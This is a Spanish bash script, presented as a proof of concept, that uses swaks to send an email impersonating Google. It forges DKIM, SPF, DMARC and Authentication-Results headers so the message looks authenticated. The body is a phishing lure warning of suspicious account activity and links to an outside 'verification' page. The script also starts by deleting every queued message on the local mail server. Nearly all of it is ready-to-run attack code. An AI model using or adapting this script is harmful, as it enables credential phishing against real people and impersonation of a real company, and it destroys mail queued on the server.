#!/bin/bash

##################################################
# Prueba de concepto POC - Google Suplantacion
# Añade cabeceras X-Mailer modificadas
# Añade verificaciones SPF, DKIM, DMARC suplantadas
# (R) hackingyseguridad.com 2025
# @antonio_taboada
##################################################

# Limpiar correos encolados en el servidor SMTP
postsuper -d ALL

# Requiere tener instalado swaks
# Simple script envia correo electronico de prueba con todas las verificaciones de seguridad suplantadas para Google

send_email_swaks() {
    local from_email="notificaciones@google.com"
    local to_email="antonio.taboada@gmail.com"

    # Generar timestamp para DKIM
    local dkim_timestamp=$(date +%s)

    echo "Enviando correo suplantando a Google..."

    swaks --to "$to_email" \
          --from "$from_email" \
          --server localhost \
          --h-Subject "Notificación importante de Google" \
          --h-From "Google Notificaciones <$from_email>" \
          --h-DKIM-Signature "v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=google2048; h=from:to:subject:date:message-id; bh=; b=" \
          --h-Authentication-Results "mail.google.com; dkim=pass (signature verified) header.d=google.com; spf=pass (google.com: domain of notificaciones@google.com designates 142.250.0.0 as permitted sender) smtp.mailfrom=notificaciones@google.com; dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=google.com" \
          --h-Received-SPF "pass (google.com: domain of notificaciones@google.com designates 142.250.0.0 as permitted sender) client-ip=142.250.0.0;" \
          --h-X-Google-DKIM-Signature "v=1; a=rsa-sha256; c=relaxed/relaxed; d=1e100.net; s=20230601; t=$dkim_timestamp; h=from:to:subject:date:message-id:feedback-id; bh=; b=" \
          --body "Estimado usuario,

Se ha detectado actividad sospechosa en su cuenta de Google.
Por favor, verifique su identidad haciendo clic en el siguiente enlace:
https://www.hackingyseguridad.com/secure/index2.htm

Atentamente,
Equipo de Seguridad de Google

Este es un correo de prueba con verificaciones de seguridad suplantadas. ;)

http://www.hackingyseguridad.com/" \
          --add-header "X-Mailer: Google Mail" \
          --add-header "X-Priority: 1" \
          --add-header "Importance: high" \
          --add-header "Precedence: bulk" \
          --add-header "MIME-Version: 1.0" \
          --add-header "Content-Type: text/html; charset=UTF-8" \
          --add-header "Date: $(date -R)"
}

# Ejecutar la función
send_email_swaks

echo ""
postqueue -f
echo ""
echo "-> Para limpiar la cola de envio del servidor SMTP en localhost: postsuper -d ALL"
echo ""
sleep 3
mailq
echo "..."
echo "POC completada - Correo suplantando a Google enviado"
